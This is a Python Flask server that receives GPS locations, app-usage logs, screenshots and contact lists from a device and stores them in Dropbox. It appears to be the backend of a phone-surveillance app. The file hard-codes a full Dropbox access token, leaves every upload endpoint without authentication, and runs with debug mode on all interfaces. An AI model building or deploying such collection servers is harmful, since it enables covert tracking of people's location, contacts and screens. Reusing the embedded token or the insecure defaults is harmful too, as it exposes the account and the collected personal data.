from flask import Flask, request, jsonify
from datetime import datetime
import dropbox
import os
import json

# 🔐 Dropbox Access Token (keep this secret in real projects!)
DROPBOX_ACCESS_TOKEN = "sl.u.AFzDS1dwpdPOypZ3ksVQJL2Z39RBEbrsYMCqbiFeAO3vYB-ys_WnN-Db4Nu_sJGDfY2svCPO3lbmmdBtbqfWBNe3ytQMbs1df-HKPFjvOGVOpvrEfRtMDgMDi-MMSg7luM5PxclWckV_9bx3Y_RVvG6N7BpJwGNzB8nUuLGsOuzSyvks2xluyvNvAxSbaw2vptr1RqH9cKcGYk2tFV2IjQWAom8UP-pzo3-SrULr1WIbx8mRPMur_eV_0uvJ379DdYexcKQlvV6zis9gXn00ffiWZZaMN2j_Opepa68ZPonZZ-Ky0GtCyKtVfSjz3RqxmewohVMF49SUVPyBNIm3GiBu1danxGtAHYvdigtfKR1DyDekQ07m3gr-N_uXgP-gK6KQesyejyKrvHlPpc3qTCZFCeH2SJ8WuthlopxcnPKOdBrYHrGp_XxwqcmpEdkhVMr9EYOsEYonjCY8WOx1JAwBe8WHOoz2kJQWAXyAKbBZu5Fq1gwEJxTXZXyl_X5Yom2C1q2QMkuUWO_y4A1WvT5baGgmRHv4OPmJUoPQELDEk2wiiqh9oO4pvTpr8qGiE3I-IpBra1yKjmemJsmm-m9UfWVooF0ggEWOgF1p5bAa81QqLqnzICfuNj628_Briq_06GXTuhgV9CzBz9JqBpWvckf_rIPDbtTTKw3xte7EqPxJ28rE92gsPCG1g7QFZsCYmJRhtTOySRhbr3r_bEMTQq2bvbFmdCAYO3CGPrEI8KRNmt9VSR6k5jy3jZsKk879hmEBnDDuh9pgBncYmdCxxNpnV95AC63AVXw6rFzddDhCdeE22obOlPe2Zf78gjb5KUUvVkaliY_JwpWIryxgbeLGa54UFTGU1jliMChFoaBDK9HEWDSm6Uarh5iTR-m84eJV9CkDZG-Sc3P7SL5H0M0Yr4SiT0f13YeTfh2IjCTDXuYZG3Oicw-tQOzsg6N4qynOaPReVc5wyB3LIMe3Q3Wa3PDL4pTRLnOrlw8W3wU1iP3g0UHitGY30M7NBEYDgQYoFmRDPnoTzt1C4lmWZMOEMy_TeJxQe6vLeMu4yIz0u0Q2vB9SpgMP6t5eJ5UFR1iVtGUWWQrFNVuxmBktrjkgM0NPao48PuZdicExfR1y0daKl7XQjweYEscSmw271tOZx54zuUq9aSMIn9RihATSbXSbnbz-8z9_IRUvUgQTAzwbnG9iRZAg0sx5W5uNdJUOLVCLEmbk2a3T-0WcOziW6KCOzaSeNt8H62ruaSiARmOQ9go13_MZC3M9e-oUG2-zLd4LVbF-uk5hcSppgaXB-nxJ-OH2ZJqxX-UJar3hT16LR5MKQT7RNXZuXctsvT3aslqzHL4m_m_O4dpiUa68mUqFEstyIafCmcxhKMUf2WfnKsNrvMY3hQzfQKHR1WTVuGUThFBFoZqdM1PBlcGccUnwvtxWR_OWlHhDZg"

app = Flask(__name__)
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# 🔽 Helper Functions
def upload_json_to_dropbox(filename, data):
    dropbox_path = f"/{filename}"
    content = (json.dumps(data) + "\n").encode("utf-8")
    dbx.files_upload(content, dropbox_path, mode=dropbox.files.WriteMode.append)

def upload_file_to_dropbox(filename, file_data):
    dropbox_path = f"/{filename}"
    dbx.files_upload(file_data.read(), dropbox_path, mode=dropbox.files.WriteMode.overwrite)

# 🏠 Root Route - Just to verify server is live
@app.route('/')
def home():
    return "✅ Server is up and running!"

# 📍 GPS Location Route
@app.route('/upload/gps', methods=['POST'])
def upload_gps():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('gps_logs.json', data)
    return jsonify({"status": "success"})

# 📱 App Usage Route
@app.route('/upload/app-usage', methods=['POST'])
def upload_app_usage():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('app_usage.json', data)
    return jsonify({"status": "success"})

# 🖼 Screenshot Upload Route
@app.route('/upload/screenshot', methods=['POST'])
def upload_screenshot():
    file = request.files.get('screenshot')
    if file:
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        upload_file_to_dropbox(filename, file)
        return jsonify({"status": "success", "filename": filename})
    return jsonify({"status": "error", "message": "No file uploaded"})

# 📇 Contacts Upload Route
@app.route('/upload/contacts', methods=['POST'])
def upload_contacts():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    upload_json_to_dropbox('contacts.json', data)
    return jsonify({"status": "success"})

# 🧪 Generic /submit route (for testing)
@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    return jsonify({"status": "received", "data": data})

# 🟢 Run Server (only for local testing; Render uses gunicorn)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
